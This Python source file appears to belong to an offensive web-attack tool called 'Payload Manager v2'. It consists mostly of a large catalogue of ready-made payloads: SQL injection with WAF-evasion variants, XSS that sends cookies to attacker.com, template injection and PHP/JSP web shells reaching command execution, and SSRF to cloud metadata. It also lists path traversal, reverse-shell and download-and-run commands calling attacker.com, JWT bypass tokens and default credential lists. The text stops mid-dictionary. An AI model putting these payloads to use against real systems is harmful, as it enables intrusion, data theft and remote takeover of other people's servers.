"""
Payload Manager v2 — 50+ categorias, WAF bypass cascata, mutação IA simulada, duplos, multi-encoding
Versao: 2.1
"""

import sys
import os
import json
import time
import hashlib
import logging
import base64
import urllib.parse
import re
import random
import string
import itertools
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
from datetime import datetime
from collections import defaultdict, Counter

log_dir = Path(__file__).parent / 'log'
log_dir.mkdir(exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    handlers=[
        logging.FileHandler(log_dir / 'payload_manager_v2.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('payload_mgr_v2')


# =========================================================================
# 50+ CATEGORIAS DE PAYLOADS
# =========================================================================

PAYLOAD_CATEGORIES = {
    # ---- SQL Injection (10 subcats) ----
    'sqli_error': {
        'category': 'sqli',
        'subcat': 'error_based',
        'description': 'SQLi error-based extraction',
        'payloads': [
            "' OR 1=1 UNION SELECT NULL--",
            "' OR 1=1 UNION SELECT 1,2,3--",
            "' OR 1=1 UNION SELECT 1,version(),3--",
            "' OR 1=1 UNION SELECT 1,@@version,3--",
            "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--",
            "' AND 1=CAST((SELECT column_name FROM information_schema.columns LIMIT 1) AS INT)--",
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
            "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
            "' OR 1=1 UNION SELECT group_concat(table_name),NULL FROM information_schema.tables--",
            "' OR 1=1 UNION SELECT group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--",
        ]
    },
    'sqli_union': {
        'category': 'sqli',
        'subcat': 'union_extract',
        'description': 'UNION-based data extraction',
        'payloads': [
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,NULL--",
            "' UNION SELECT 1,2--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3,4--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT 1,@@version,3--",
            "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--",
            "' UNION SELECT 1,@@datadir,3--",
            "' UNION SELECT 1,SCHEMA_NAME,3 FROM information_schema.SCHEMATA--",
            "' UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()--",
            "' UNION SELECT 1,COLUMN_NAME,3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users'--",
            "' UNION SELECT 1,username,3 FROM users--",
            "' UNION SELECT 1,password,3 FROM users--",
            "' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--",
        ]
    },
    'sqli_blind_bool': {
        'category': 'sqli',
        'subcat': 'blind_boolean',
        'description': 'Boolean-based blind SQLi',
        'payloads': [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SUBSTRING(version(),1,1)='5'--",
            "' AND SUBSTRING(version(),1,1)='10'--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' AND (SELECT COUNT(*) FROM admin_users)>0--",
            "' AND (SELECT LENGTH(password) FROM users LIMIT 1)>5--",
            "' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))>97--",
            "' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='users' AND column_name='password')>0--",
            "' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--",
        ]
    },
    'sqli_blind_time': {
        'category': 'sqli',
        'subcat': 'blind_time',
        'description': 'Time-based blind SQLi',
        'payloads': [
            "' AND SLEEP(5)--",
            "' AND sleep(5)--",
            "' AND IF(1=1,SLEEP(5),0)--",
            "WAITFOR DELAY '0:0:5'--",
            "' OR IF(1=1,SLEEP(5),0)--",
            "' AND BENCHMARK(10000000,SHA1('test'))--",
            "' AND SLEEP(CASE WHEN (1=1) THEN 5 ELSE 0 END)--",
            "1' AND (SELECT SLEEP(5))--",
        ]
    },
    'sqli_stacked': {
        'category': 'sqli',
        'subcat': 'stacked_queries',
        'description': 'Stacked query injection',
        'payloads': [
            "; SELECT * FROM users--",
            "; DROP TABLE users--",
            "; INSERT INTO admins VALUES('hacker','pwned')--",
            "; ALTER USER 'root'@'localhost' IDENTIFIED BY 'pwned'--",
            "; CREATE TABLE backdoor(cmd TEXT)--",
            "; SELECT * INTO OUTFILE '/tmp/cmd.txt' FROM users--",
            "; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' IDENTIFIED BY 'pwned'--",
        ]
    },
    'sqli_noql': {
        'category': 'sqli',
        'subcat': 'noql_injection',
        'description': 'NoSQL injection for MongoDB',
        'payloads': [
            '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"$where": "return 1==1"}',
            '{"$where": "return this.username === \'admin\'"}',
            "'; return true; //",
            '{"$or": [{"username": ""}, {"username": {"$ne": null}}]}',
        ]
    },
    'sqli_hql': {
        'category': 'sqli',
        'subcat': 'hql_injection',
        'description': 'Hibernate HQL injection',
        'payloads': [
            "' FROM User u WHERE u.username = 'admin' --",
            "1' AND 1=1 UNION ALL SELECT username,password FROM users--",
            "org.hibernate.hql.ast.QueryTranslatorImpl: ERROR",
            "' ORDER BY 1--",
            "' ORDER BY 10--",
        ]
    },
    'sqli_waf_bypass': {
        'category': 'sqli',
        'subcat': 'waf_bypass',
        'description': 'WAF evasion for SQLi',
        'payloads': [
            "'/**/OR/**/1=1--",
            "'%0aOR%0a1=1--",
            "'%09OR%091=1--",
            "1%27%20OR%201=1%23",
            "'UNION%0ASELECT%0A1,2,3--",
            "'%26%26%201=1--",
            "'||'1'='1",
            "1' AND '1'='1' UNION SELECT 1,2,3--",
        ]
    },
    'sqli_double_encode': {
        'category': 'sqli',
        'subcat': 'double_encode',
        'description': 'Double URL-encoded SQLi',
        'payloads': [
            "%2527%2520OR%25201%253D1%252D%252D",
            "%2527%2520UNION%2520SELECT%25201%252C2%252C3%252D%252D",
            "%2527%2520AND%25201%253D1%252D%252D",
            "%2555%254E%2549%254F%254E%2520%2553%2545%254C%2545%2543%2554",
        ]
    },
    'sqli_comment_bypass': {
        'category': 'sqli',
        'subcat': 'comment_bypass',
        'description': 'Comment-based WAF bypass',
        'payloads': [
            "'/*comment*/OR/*comment*/1=1--",
            "admin'/*X*/AND/*X*/1=1--",
            "' union/*a*/select/*b*/1,2,3--",
        ]
    },

    # ---- XSS (8 subcats) ----
    'xss_reflected': {
        'category': 'xss',
        'subcat': 'reflected',
        'description': 'Reflected XSS payloads',
        'payloads': [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<input autofocus onfocus=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<video><source onerror="javascript:alert(1)">',
            '<body background="javascript:alert(1)">',
            '"><script>alert(document.cookie)</script>',
            '" onclick="alert(1)" x="',
            "' onmouseover='alert(1)'",
            '"><img src=x onerror=alert(String.fromCharCode(88,83,83))>',
            '<svg><script>alert(1)%3B</script>',
        ]
    },
    'xss_dom': {
        'category': 'xss',
        'subcat': 'dom_xss',
        'description': 'DOM-based XSS',
        'payloads': [
            'javascript:alert(1)',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            '<script>document.location="http://attacker.com/?c="+document.cookie</script>',
            '<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>',
            '<a href="javascript:fetch(\'http://attacker.com/\'+document.cookie)">x</a>',
            '"><script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>',
        ]
    },
    'xss_stored': {
        'category': 'xss',
        'subcat': 'stored',
        'description': 'Stored XSS payloads',
        'payloads': [
            '<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>',
            '<img src=x onerror="new Image().src=\'http://attacker.com/?cookie=\' + document.cookie">',
            '<a href="javascript:fetch(\'http://attacker.com/\'+document.cookie)">click</a>',
            '<script>new Image().src="http://attacker.com/log?c="+document.cookie;</script>',
            '<svg onload="fetch(\'http://attacker.com/\'+document.cookie.replace(\'{\',\'%7B\').replace(\'}\',\'%7D\'))"> ',
            '<details open ontoggle="fetch(\'http://attacker.com/\'+document.cookie.replace(\'{\',\'%7B\').replace(\'}\',\'%7D\'))"> ',
        ]
    },
    'xss_ssti': {
        'category': 'xss',
        'subcat': 'ssti',
        'description': 'Server-Side Template Injection',
        'payloads': [
            '{{7*7}}',
            '{{config}}',
            '{{config.__class__.__mro__[1].__subclasses__()}}',
            '{{request.application.__globals__.__builtins__}}',
            '{{self._TemplateReference__context.cycler.__init__.__globals__}}',
            '{{self._TemplateReference__context.joiner.__init__.__globals__}}',
            '{{url_for.__globals__}}',
            '{{config.from_object(\'os\') and os.popen(\'id\').read()}}',
        ]
    },
    'xss_polyglot': {
        'category': 'xss',
        'subcat': 'polyglot',
        'description': 'Polyglot XSS — works across multiple contexts',
        'payloads': [
            'javascript://\n<script>alert(1)</script>',
            '"><Script>alert(String.fromCharCode(88,83,83))</ScRipt>',
            '";alert(String.fromCharCode(88,83,83));//\u0022>alert(String.fromCharCode(88,83,83));//\'></Script>"\'><Script>alert(String.fromCharCode(88,83,83))</Script>',
            '"/><scr\x00ipt>alert(1)</script>',
            '\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e',
        ]
    },
    'xss_waf_bypass': {
        'category': 'xss',
        'subcat': 'waf_bypass',
        'description': 'WAF evasion for XSS',
        'payloads': [
            '<s%00cript>alert(1)</script>',
            '<scr%00ipt>alert(1)</script>',
            '%3cscript%3ealert(1)%3c/script%3e',
            '<SCRIPT>XSS</SCRIPT>',
            '<ScRiPt>alert(1)</ScRiPt>',
            '<script >alert(1)</script >',
            '<script src=data:,alert(1)>',
            '<img src=x:onclick=alert(1)//>',
        ]
    },
    'xss_event_handler': {
        'category': 'xss',
        'subcat': 'event_handler',
        'description': 'Event handler XSS',
        'payloads': [
            '<div onmouseover="alert(1)">hover</div>',
            '<input onfocus="alert(1)" autofocus>',
            '<body onload="alert(1)">',
            '<img src=x onerror="alert(1)">',
            '<svg onload="alert(1)">',
            '<details open ontoggle="alert(1)">',
            '<video><source onerror="alert(1)">',
            '<audio src=x onerror="alert(1)">',
            '<object data="data:text/html,<script>alert(1)</script>">',
            '<embed src="javascript:alert(1)">',
        ]
    },
    'xss_html_injection': {
        'category': 'xss',
        'subcat': 'html_injection',
        'description': 'HTML injection for phish',
        'payloads': [
            '<form action="http://attacker.com/steal" method=POST><input name=user><input name=pass type=password><input type=submit></form>',
            '<iframe src="http://attacker.com/phish" width=100% height=100>',
            '<meta http-equiv="refresh" content="0;url=http://attacker.com">',
            '<link rel="import" href="http://attacker.com/cookie.js">',
        ]
    },

    # ---- SSTI (6 subcats) ----
    'ssti_jinja2': {
        'category': 'ssti',
        'subcat': 'jinja2',
        'description': 'Jinja2 template injection',
        'payloads': [
            '{{7*7}}',
            '{{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}',
            '{{config.__class__.__mro__[1].__subclasses__()}}',
            '{% for key in dir(\"\".__class__.__mro__[1].__subclasses__()) %}{{ key }}{% endfor %}',
            '{{ self._TemplateReference__context.cycler.__init__.__globals__[\'os\'].popen(\'id\').read() }}',
            '{{ self._TemplateReference__context.joiner.__init__.__globals__[\'os\'].popen(\'id\').read() }}',
            '{{ lipsum.__globals__[\'os\'].popen(\'id\').read() }}',
        ]
    },
    'ssti_spip': {
        'category': 'ssti',
        'subcat': 'spip',
        'description': 'SPIP template injection',
        'payloads': [
            '#SET{a,inflate}|#{a}{#ENV{x,default}}',
            '#INCLURE{fichier={#ENV{x}}}',
            '#SET{a,exec}|#{a}{#ENV{x,default}}',
        ]
    },
    'ssti_mako': {
        'category': 'ssti',
        'subcat': 'mako',
        'description': 'Mako template injection',
        'payloads': [
            '${7*7}',
            '${x.__class__.__mro__[1].__subclasses__()}',
            '${"". __class__.mro()[1].__subclasses__()}',
            '${seek(\'/etc/passwd\')}',
            '${getattr(request,\'application\').__globals__[\'os\'].popen(\'id\').read()}',
        ]
    },
    'ssti_erb': {
        'category': 'ssti',
        'subcat': 'erb_ruby',
        'description': 'ERB/Ruby template injection',
        'payloads': [
            '<%= 7*7 %>',
            '<%= `id` %>',
            '<%= system(\'id\') %>',
            '<%= exec(\'id\') %>',
            '<%= IO.popen(\'id\').read() %>',
            '<%= eval(\'7*7\') %>',
            '<%= `cat /etc/passwd` %>',
        ]
    },
    'ssti_thymeleaf': {
        'category': 'ssti',
        'subcat': 'thymeleaf',
        'description': 'Thymeleaf template injection',
        'payloads': [
            '${7*7}',
            '${T(java.lang.Runtime).getRuntime().exec(\'id\')}',
            '${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"}).getInputStream())}',
            '${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"}).getInputStream()).useDelimiter(\\"\\\\A\\").next()}',
        ]
    },
    'ssti_freemarker': {
        'category': 'ssti',
        'subcat': 'freemarker',
        'description': 'FreeMarker template injection',
        'payloads': [
            '${"?api"??config?replace("config","")}',
            '${("freemarker.template.utility.Execute")?new()("id")}',
            '${c.data["foo"]?new("id")}',
        ]
    },

    # ---- SSRF (7 subcats) ----
    'ssrf_basic': {
        'category': 'ssrf',
        'subcat': 'basic',
        'description': 'Basic SSRF payloads',
        'payloads': [
            'http://127.0.0.1:8080',
            'http://169.254.169.254/latest/meta-data/',
            'http://localhost/admin',
            'http://[::]:8080',
            'http://0.0.0.0:8080',
            'http://[0:0:0:0:0:ffff:127.0.0.1]:8080',
            'http://10.0.0.1',
            'http://192.168.1.1',
        ]
    },
    'ssrf_advanced': {
        'category': 'ssrf',
        'subcat': 'advanced',
        'description': 'Advanced SSRF with bypass techniques',
        'payloads': [
            'http://127.0.0.1:8080?redirect=http://169.254.169.254',
            'http://example.com@169.254.169.254',
            'http://[127.0.0.1]',
            'http://2130706433',
            'http://0x7f000001',
            'http://017700000001',
            'http://0x7f.0x0.0x0.0x1',
            'http://127.1',
            'gopher://127.0.0.1:8080/_GET /admin HTTP/1.1%0d%0aHost: 127.0.0.1%0d%0a%0d%0a',
        ]
    },
    'ssrf_gopher': {
        'category': 'ssrf',
        'subcat': 'gopher',
        'description': 'Gopher protocol SSRF',
        'payloads': [
            'gopher://127.0.0.1:6379/_INFO',
            'gopher://127.0.0.1:3306/_SELECT%20*%20FROM%20users--',
            'gopher://127.0.0.1:25/_EHLO%20attacker.com%0d%0aMAIL%20FROM%3A%20attacker%40attacker.com%0d%0aRCPT%20TO%3A%20victim%40victim.com%0d%0aDATA%0d%0a%0d%0a',
            'gopher://127.0.0.1:11211/_set%20shellcode%200%200%20132%0d%0a%60%3C%60',
        ]
    },
    'ssrf_blind': {
        'category': 'ssrf',
        'subcat': 'blind_ssrf',
        'description': 'Blind SSRF with OOB detection',
        'payloads': [
            'http://attacker.com:8080',
            'http://attacker.com:80',
            'http://your-domain.com',
            'https://your-domain.com',
        ]
    },
    'ssrf_protocol': {
        'category': 'ssrf',
        'subcat': 'protocol',
        'description': 'Protocol-based SSRF',
        'payloads': [
            'file:///etc/passwd',
            'file:///c:/windows/win.ini',
            'gopher://127.0.0.1:8080',
            'dict://127.0.0.1:8080:',
            'ldap://127.0.0.1:389/',
            'tftp://127.0.0.1:69/attacker.sh',
            'dict://127.0.0.1:11211/stat',
        ]
    },
    'ssrf_dns_rebind': {
        'category': 'ssrf',
        'subcat': 'dns_rebind',
        'description': 'DNS rebinding SSRF',
        'payloads': [
            'http://home.local/cgi-bin/../../../etc/passwd',
            'http://localhost.example.evil.com',
            'http://internal.corp.local',
        ]
    },
    'ssrf_post_body': {
        'category': 'ssrf',
        'subcat': 'post_body',
        'description': 'POST-body SSRF',
        'payloads': [
            'url=http://169.254.169.254/latest/meta-data/',
            'uri=http://127.0.0.1:8080/admin',
            'path=http://localhost:3306',
        ]
    },

    # ---- LFI (6 subcats) ----
    'lfi_basic': {
        'category': 'lfi',
        'subcat': 'basic',
        'description': 'Basic LFI / path traversal',
        'payloads': [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '....//....//....//etc/passwd',
            '%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            '..%252f..%252f..%252fetc/passwd',
            '....//....//etc/passwd',
            '/../',
            '.../.../.../etc/passwd',
        ]
    },
    'lfi_filter_bypass': {
        'category': 'lfi',
        'subcat': 'filter_bypass',
        'description': 'LFI filter bypass',
        'payloads': [
            '../../../etc/passwd%00',
            '../../../etc/passwd\0',
            '%00../../../etc/passwd',
            'php://filter/convert.base64-encode/resource=/etc/passwd',
            'php://filter/convert.base64-encode/resource=config.php',
            'php://filter/read=string.rot13/resource=config.php',
            'php://input',
            'expect://id',
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
        ]
    },
    'lfi_log_poison': {
        'category': 'lfi',
        'subcat': 'log_poison',
        'description': 'Log poisoning for LFI',
        'payloads': [
            '<?php system($_GET["cmd"]); ?>',
            '<script>alert(1)</script>',
            '<?php echo shell_exec($_GET["cmd"]); ?>',
            '*/<?php system($_GET["cmd"]); ?>',
        ]
    },
    'lfi_proc': {
        'category': 'lfi',
        'subcat': 'proc_read',
        'description': 'Proc filesystem access',
        'payloads': [
            '/proc/self/environ',
            '/proc/self/cmdline',
            '/proc/self/maps',
            '/proc/version',
            '/proc/net/if_inet6',
            '/proc/net/tcp',
            '/proc/self/root/etc/passwd',
        ]
    },
    'lfi_waf_bypass': {
        'category': 'lfi',
        'subcat': 'waf_bypass',
        'description': 'WAF bypass for LFI',
        'payloads': [
            '..%252f..%252f..%252fetc%252fpasswd',
            '%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            '....//....//....//etc/passwd',
            '..%c0%af..%c0%af..%c0%afetc/passwd',
            '..%c1%9c..%c1%9c..%c1%9cetcpasswd',
        ]
    },
    'lfi_windows': {
        'category': 'lfi',
        'subcat': 'windows',
        'description': 'Windows LFI targets',
        'payloads': [
            'C:\\Windows\\win.ini',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'C:\\Windows\\System32\\config\\SAM',
            'C:\\boot.ini',
            'C:\\Windows\\php.ini',
            'C:\\xampp\\htdocs\\config.php',
        ]
    },

    # ---- RCE / CMDI (6 subcats) ----
    'cmdi_basic': {
        'category': 'rce',
        'subcat': 'command_injection',
        'description': 'OS command injection',
        'payloads': [
            '; id',
            '| id',
            '&& id',
            '$(id)',
            '`id`',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '; whoami',
            '| whoami',
            '$(whoami)',
            '; hostname',
            '| hostname',
            '; net user',
            '| net user',
            '$(net user)',
        ]
    },
    'cmdi_encoded': {
        'category': 'rce',
        'subcat': 'encoded_injection',
        'description': 'Encoded command injection',
        'payloads': [
            ';echo+Y2F0IC9ldGMvcGFzc3dk|base64+-d|sh',
            '$(echo LWNtZCBjbWQ+CnlzZXhlYygkeV9HRVRbImNtZCJdKQ==|base64+-d)',
            ';echo PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7 Pz4 | base64 -d > shell.php',
            '${@print(md5(1))}',
        ]
    },
    'cmdi_oscmdi': {
        'category': 'rce',
        'subcat': 'os_command_injection',
        'description': 'OS-specific command injection',
        'payloads': [
            '; powershell -enc IEX (New-Object Net.WebClient).DownloadString(\'http://attacker.com/shell.ps1\')',
            '; curl http://attacker.com/shell.php -o /var/www/html/shell.php',
            '| nc -e /bin/sh attacker.com 4444',
            '; bash -i >& /dev/tcp/attacker.com/4444 0>&1',
            '| python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        ]
    },
    'cmdi_jsp': {
        'category': 'rce',
        'subcat': 'jsp_rce',
        'description': 'JSP remote code execution',
        'payloads': [
            '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
            '<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>',
            '<% Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); %> <%= new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream())).readLine() %>',
            '<%@ page import="java.io.*" %><%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
        ]
    },
    'cmdi_nginx': {
        'category': 'rce',
        'subcat': 'nginx_rce',
        'description': 'Nginx-related RCE',
        'payloads': [
            'location ~ \\.php$ { fastcgi_pass 127.0.0.1:9000; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; }',
            '^(/.*)$ /index.php?q=$1 [QSA,L]',
        ]
    },
    'cmdi_nodejs': {
        'category': 'rce',
        'subcat': 'nodejs_rce',
        'description': 'Node.js command injection',
        'payloads': [
            '; process.mainModule.require(\'child_process\').execSync(\'id\').toString()',
            '&& node -e "require(\'child_process\').exec(\'id\')"',
            '${require(\'child_process\').execSync(\'id\').toString()}',
        ]
    },

    # ---- Auth Bypass (6 subcats) ----
    'auth_sqli': {
        'category': 'auth',
        'subcat': 'sqli_auth',
        'description': 'SQLi authentication bypass',
        'payloads': [
            "admin' --",
            "admin' #",
            "admin'/*",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1 Limit 1 --",
            "admin' AND 1=1 UNION SELECT 1,'admin','admin'--",
            "' UNION SELECT 1,'admin','hashed_password_here'--",
        ]
    },
    'auth_jwt_bypass': {
        'category': 'auth',
        'subcat': 'jwt_bypass',
        'description': 'JWT authentication bypass',
        'payloads': [
            'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.',
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.eyJTb21lQXV0aCI6IkRlc3Ryb3kiLCJSb2xlIjoiQWRtaW4iLCJVc2VyIjoiQWRtaW4ifQ__',
            'Sign the JWT with: secret, password, key, jwt_secret, admin, 123456',
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InVzZXIifQ.eyJyb2xlIjoiYWRtaW4ifQ.',
        ]
    },
    'auth_default_cred': {
        'category': 'auth',
        'subcat': 'default_credentials',
        'description': 'Default credential attacks',
        'payloads': [
            ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
            ('admin', 'admin123'), ('root', 'toor'), ('root', 'password'),
            ('administrator', 'administrator'), ('sa', 'sa'), ('sa', 'password'),
            ('admin', 'root'), ('test', 'test'), ('user', 'user'),
            ('guest', 'guest'), ('admin', 'P@ssw0rd'),
        ]
    },
    'auth_token_leak': {
        'category': 'auth',
        'subcat': 'token_leak',
        'description': 'Token leakage techniques',
        'payloads': [
            'Authorization: Bearer [REDACTED_BEARER]',
            'X-API-Key: [REDACTED_API_KEY]',
            'Cookie: session=[REDACTED_SESSION]',
            'Cookie: token=[REDACTED_TOKEN]',
            'Cookie: PHPSESSID=[REDACTED_PHPSESSID]',
        ]
    },
    'auth_rate_limit': {
        'category': 'auth',
        'subcat': 'rate_limit_bypass',
        'description': 'Rate limit bypass',
        'payloads': [
            'X-Forwarded-For: 127.0.0.1',
            'X-Originating-IP: 127.0.0.1',
            'X-Remote-IP: 127.0.0.1',
            'X-Client-IP: 127.0.0.1',
            'Forwarded: for=127.0.0.1',
        ]
    },
    'auth_otp_bypass': {
        'category': 'auth',
        'subcat': 'otp_bypass',
        'description': 'OTP bypass techniques',
        'payloads': [
            '000000', '111111', '999999', '123456',
            'X-OTP-Bypass: true',
            'X-Reset-OTP: true',
        ]
    },

    # ---- GraphQL (5 subcats) ----
    'graphql_introspection': {
        'category': 'graphql',
        'subcat': 'introspection',
        'description': 'GraphQL introspection queries',
        'payloads': [
            '{"query":"{__schema{types{name}}}"}',
            '{"query":"{__type(name:\\"Query\\"){fields{name,type{name}}}}"}',
            '{"query":"{__schema{mutationType{name}}"}',
            '{"query":"{__schema{types{name fields{name type{name}}}}}"}',
            '{"query":"{users{id username email}}"}',
        ]
    },
    'graphql_batch': {
        'category': 'graphql',
        'subcat': 'batch',
        'description': 'GraphQL batching attacks',
        'payloads': [
            '[{"query":"{users{id}}"},{"query":"{users{id}}"},{"query":"{users{id}}"}]',
            '{"query":"{users { id name email password }}"}',
        ]
    },
    'graphql_dos': {
        'category': 'graphql',
        'subcat': 'dos',
        'description': 'GraphQL DoS payloads',
        'payloads': [
            '{"query":"{users { posts { comments { replies { author { posts { comments { replies { author { posts { comments { replies { author { name } } } } } } } } } } } } } }"}',
            '{"query":"{__schema { types { name fields { name type { name } } } } }"}',
        ]
    },
    'graphql_inject': {
        'category': 'graphql',
        'subcat': 'injection',
        'description': 'GraphQL injection',
        'payloads': [
            '{"query":"{users(where: {username: {\\"$regex\\": \\".^admin.\\"}}) {id username}}"}',
            '{"query":"{users(first: 100000)}"}',
        ]
    },
    'graphql_mass_assign': {
        'category': 'graphql',
        'subcat': 'mass_assignment',
        'description': 'GraphQL mass assignment',
        'payloads': [
            '{"mutation{$updateUser(id:"1"){input:{role:"admin",isAdmin:true}}){user{id role}}}',
            '{"mutation{$updateProduct(id:"1"){input:{price:0.01}}){product{id price}}}',
        ]
    },

    # ---- Race Condition (3 subcats) ----
    'race_condition': {
        'category': 'race',
        'subcat': 'basic',
        'description': 'Race condition payloads',
        'payloads': [
            {'method': 'POST', 'path': '/api/transfer', 'body': '{"amount": 1000, "to": "attacker"}'},
        ]
    },
    'race_token': {
        'category': 'race',
        'subcat': 'token',
        'description': 'Token race condition',
        'payloads': [
            {'method': 'POST', 'path': '/api/coupon/redeem', 'body': '{"code": "SAVE20"}'},
        ]
    },
    'race_double_spend': {
        'category': 'race',
        'subcat': 'double_spend',
        'description': 'Double spend race',
        'payloads': [
            {'method': 'POST', 'path': '/api/payment', 'body': '{"amount": 999, "to": "self"}'},
        ]
    },

    # ---- HTTP Smuggling (3 subcats) ----
    'http_smuggling_cl_te': {
        'category': 'http_smuggling',
        'subcat': 'cl_te',
        'description': 'CL.TE smuggling',
        'payloads': [
            'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nX: X\r\n',
            'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /secret HTTP/1.1\r\nHost: target.com\r\n',
        ]
    },
    'http_smuggling_h2': {
        'category': 'http_smuggling',
        'subcat': 'h2',
        'description': 'HTTP/2 smuggling',
        'payloads': [
            'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n',
            'POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nX: ',
        ]
    },
    'http_smuggling_h0_h1': {
        'category': 'http_smuggling',
        'subcat': 'h0_h1',
        'description': 'HTTP/0.9 to 1.1 smuggling',
        'payloads': [
            'GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\nGET /secret HTTP/1.0\r\n',
        ]
    },

    # ---- Prototype Pollution (2) ----
    'prototype_pollution': {
        'category': 'prototype_pollution',
        'subcat': 'pollution',
        'description': 'JavaScript prototype pollution',
        'payloads': [
            '{"__proto__": {"admin": true}}',
            '{"constructor": {"prototype": {"admin": true}}}',
            '{"foo": {"bar": "baz"}}',
            '{"a": {"isPrototypeOf": 1}}',
            '{"__defineGetter__": "evil"}',
        ]
    },
    'prototype_pollution_rce': {
        'category': 'prototype_pollution',
        'subcat': 'rce',
        'description': 'Prototype pollution to RCE',
        'payloads': [
            '{"__proto__":{"unsafeKey":"<script>alert(1)</script>"}}',
            '{"constructor":{"prototype":{"__esModule":true}}}',
        ]
    },

    # ---- LDAP Injection (4) ----
    'ldap_inject': {
        'category': 'ldap',
        'subcat': 'injection',
        'description': 'LDAP injection payloads',
        'payloads': [
            '*)(|(objectclass=*)',
            '*)(uid=*))(|(uid=*',
            '*)(|(mail=*))',
            '*)(objectclass=*)',
            '*/*',
            '*%00',
            '*)(& (uid=*))',
        ]
    },
    'ldap_auth_bypass': {
        'category': 'ldap',
        'subcat': 'auth_bypass',
        'description': 'LDAP authentication bypass',
        'payloads': [
            '*)(& (uid=*))(',
            '*)(uid=*))(|(uid=*',
            '*)(|(&(uid=)(userPassword={MD5}4j3k2j3k2j3k2))',
        ]
    },
    'ldap_search_st': {
        'category': 'ldap',
        'subcat': 'search_time',
        'description': 'LDAP search time attack',
        'payloads': [
            '*)(uid=ADMIN*)(uid=*',
            '*)(uid=*))(|(uid=*',
        ]
    },
    'ldap_truncation': {
        'category': 'ldap',
        'subcat': 'truncation',
        'description': 'LDAP truncation attack',
        'payloads': [
